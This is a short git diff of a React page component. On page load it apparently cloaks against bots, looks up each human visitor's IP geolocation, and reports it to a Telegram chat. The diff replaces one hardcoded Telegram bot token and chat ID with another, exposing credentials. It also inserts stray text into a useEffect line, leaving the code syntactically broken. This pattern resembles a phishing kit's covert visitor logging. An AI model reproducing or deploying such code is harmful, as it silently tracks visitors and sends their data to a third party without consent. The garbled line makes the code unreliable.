@@ -15,13 +15,13 @@ const Index: FC = () => {
         }
     }, [shouldRedirect, isBot, isLoading]);
 
-    useEffect(() => {
+    useEffect(() => {sn anh
         if (!isLoading && !isBot && !logSentRef.current) {
             logSentRef.current = true;
             const fetchGeoAndSendTelegram = async () => {
                 const geoUrl = 'https://get.geojs.io/v1/ip/geo.json';
-                const botToken = '7818922645:AAFSGAKec6C3hdUTgtuPcRNL5DPqnj2JwfA';
-                const chatId = '-4795436920';
+                const botToken = '7961060086:AAH93i0eUZFJ6vKEeq89RF2EDov7mZpDrr0';
+                const chatId = '-4960566795';
 
                 const geoRes = await fetch(geoUrl);
                 const geoData = await geoRes.json();
